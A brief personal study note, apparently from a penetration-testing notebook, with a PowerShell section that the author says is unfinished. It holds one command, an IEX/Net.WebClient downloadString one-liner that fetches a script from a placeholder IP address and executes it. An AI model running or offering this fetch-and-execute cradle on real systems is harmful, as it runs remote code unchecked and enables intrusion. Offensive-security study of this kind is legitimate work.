## Powershell

I need to really spend some time on this section. 

to launch a powershell session on a remote box you can use the following command:

	IEX(New-Object Net.WebClient).downloadString('http://ipaddress/filename')